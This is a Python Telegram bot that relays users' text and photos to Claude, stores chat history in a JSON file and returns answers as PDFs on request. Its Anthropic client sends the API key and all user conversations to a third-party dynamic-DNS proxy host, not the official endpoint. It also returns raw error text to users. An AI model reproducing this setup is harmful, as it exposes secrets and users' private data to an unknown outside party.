import os
import json
import html
import base64
import asyncio
import matplotlib
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from anthropic import Anthropic
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont

TELEGRAM_TOKEN = os.environ["TELEGRAM_TOKEN"]
ANTHROPIC_API_KEY = os.environ["ANTHROPIC_API_KEY"]

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher()
client = Anthropic(
    api_key=ANTHROPIC_API_KEY,
    base_url="https://claude-tokens.duckdns.org"
)

HISTORY_FILE = "history.json"

def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return {int(k): v for k, v in data.items()}
    return {}

def save_history():
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history, f, ensure_ascii=False)

history = load_history()

WEB_SEARCH_TOOL = {
    "type": "web_search_20250305",
    "name": "web_search"
}

FONT_PATH = os.path.join(matplotlib.get_data_path(), "fonts", "ttf", "DejaVuSans.ttf")
pdfmetrics.registerFont(TTFont("DejaVuSans", FONT_PATH))

def generate_pdf(text: str, filepath: str):
    doc = SimpleDocTemplate(filepath, pagesize=A4)
    styles = getSampleStyleSheet()
    style = ParagraphStyle(
        "Custom",
        parent=styles["Normal"],
        fontName="DejaVuSans",
        fontSize=11,
        leading=16,
    )
    story = []
    for paragraph in text.split("\n"):
        if paragraph.strip():
            safe_text = html.escape(paragraph)
            story.append(Paragraph(safe_text, style))
            story.append(Spacer(1, 8))
    doc.build(story)

def extract_text(content_blocks):
    return "\n".join(block.text for block in content_blocks if block.type == "text")

def wants_pdf(text: str) -> bool:
    if not text:
        return False
    lowered = text.lower()
    return "pdf" in lowered or "пдф" in lowered

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    history[message.chat.id] = []
    save_history()
    await message.answer("Привет! Я бот на Claude 🤖 Помню историю, умею фото, поиск в интернете и PDF.")

@dp.message(Command("reset"))
async def reset_handler(message: types.Message):
    history[message.chat.id] = []
    save_history()
    await message.answer("История очищена.")

@dp.message(lambda m: m.photo is not None)
async def photo_handler(message: types.Message):
    chat_id = message.chat.id
    history.setdefault(chat_id, [])

    photo = message.photo[-1]
    file = await bot.get_file(photo.file_id)
    file_bytes = await bot.download_file(file.file_path)
    image_b64 = base64.b64encode(file_bytes.read()).decode("utf-8")

    caption = message.caption or "Что на этом фото?"

    user_content = [
        {
            "type": "image",
            "source": {
                "type": "base64",
                "media_type": "image/jpeg",
                "data": image_b64
            }
        },
        {"type": "text", "text": caption}
    ]

    history[chat_id].append({"role": "user", "content": user_content})
    save_history()

    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=2048,
            messages=history[chat_id],
            tools=[WEB_SEARCH_TOOL]
        )
        reply = extract_text(response.content) or "Не получилось сформулировать ответ, попробуйте переформулировать вопрос."
        history[chat_id].append({"role": "assistant", "content": reply})
        save_history()

        if wants_pdf(caption):
            pdf_path = f"/tmp/{chat_id}_answer.pdf"
            generate_pdf(reply, pdf_path)
            await message.answer_document(types.FSInputFile(pdf_path), caption="Готово! 📄")
        else:
            await message.answer(reply)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message()
async def claude_handler(message: types.Message):
    chat_id = message.chat.id
    history.setdefault(chat_id, [])
    history[chat_id].append({"role": "user", "content": message.text})
    save_history()
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=2048,
            messages=history[chat_id],
            tools=[WEB_SEARCH_TOOL]
        )
        reply = extract_text(response.content) or "Не получилось сформулировать ответ, попробуйте переформулировать вопрос."
        history[chat_id].append({"role": "assistant", "content": reply})
        save_history()

        if wants_pdf(message.text):
            pdf_path = f"/tmp/{chat_id}_answer.pdf"
            generate_pdf(reply, pdf_path)
            await message.answer_document(types.FSInputFile(pdf_path), caption="Готово! 📄")
        else:
            await message.answer(reply)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
